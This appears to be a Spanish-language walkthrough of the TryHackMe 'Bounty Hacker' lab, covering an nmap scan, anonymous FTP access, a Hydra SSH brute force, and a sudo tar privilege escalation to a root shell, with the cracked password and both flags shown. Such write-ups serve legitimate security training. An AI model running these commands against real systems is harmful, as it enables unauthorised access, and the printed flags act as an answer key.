Ip victima: 10.10.142.48

## Nmap

Realizamos un scaneo rápido

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn 10.10.142.48
| COMANDO  | RESULTADO |
| ------------- | ------------- |
| -p-  | Escanea todos los puertos(65535)  |
| --open  | Solo muestra los puertos que están abiertos  |
| -sS  | Realiza un escaneo SYN |
| -sC  | Ejecuta scripts por defecto de nmap  |
| -sV  | Detecta la versión de los servicios  |
| --min-rate=5000  | Fuerza una velocidad mínima de escaneo de 5000 paquetes por segundo  |
| -vvv  | Muestra salida muy detallada  |
| -n  | Desactiva la resolución de nombres DNS  |
| -Pn  | No hace ping  |

## Respuesta de NMAP

| PORT  | SERVICE |
| ------------- | ------------- |
| 21  | FTP  |
| 22  | SSH  |
| 80  | APACHE  |

## FTP

ftp 10.10.142.48
user: anonymous

Listamos los archivos que hay en el servidor con el comando dir

```bash
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

mediante el comando get nos bajamos los dos archivos
```bash
get task.txt
get locks.txt
```

Una vez tenemos descargado los dos archivos, vemos el contenido de ellos mediante cat

```bash
cat task.txt
cat locks.txt
```
En el archivo task.txt vemos que hay un posible usuario "lin" y en el archivo locks.txt vemos que es un diccionario de contraseñas.


## Fuerza bruta

```bash
hydra ssh://10.10.142.48 -l lin -P locks.txt
```
| COMANDO  | RESULTADO |
| ------------- | ------------- |
| ssh://10.10.142.48  | Especifica que el objetivo del ataque es el servicio SSH  |
| -l lin  | Define el nombre de usuario con el que se va a probar  |
| -P locks.txt  | Especifica el archivo de diccionario de contraseñas que Hydra va a usar  |

Obtenemos el siguiente resultado:

```bash
[22][ssh] host: 10.10.142.48   login: lin   password: RedDr4gonSynd1cat3
```

## SSH

```bash
ssh lin@10.10.142.48
Password: RedDr4gonSynd1cat3
```

Realizamos un ls y vemos la primera flag: user.txt
Mediante cat vemos el contenido del archivo: THM{CR1M3_SyNd1C4T3}

Realizamos el comando sudo -l para ver donde tiene permisos de ejecucion el usuario lin

```bash
sudo -l
password: RedDr4gonSynd1cat3
```

Se puede ver que podemos ejecutar tar como root.

Accedemos a la página https://gtfobins.github.io/ y buscamos tar

Vamos a Sudo

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Para recuperar la terminal ejecutamos el siguiente comando.

```bash
script /dev/null -c bash
```
Ejecutamos el comando whoami y vemos que somos root.

Accedemos al direcctorio root y listamos directorios

```bash
root@bountyhacker:/root# cat root.txt 
THM{80UN7Y_h4cK3r}
```
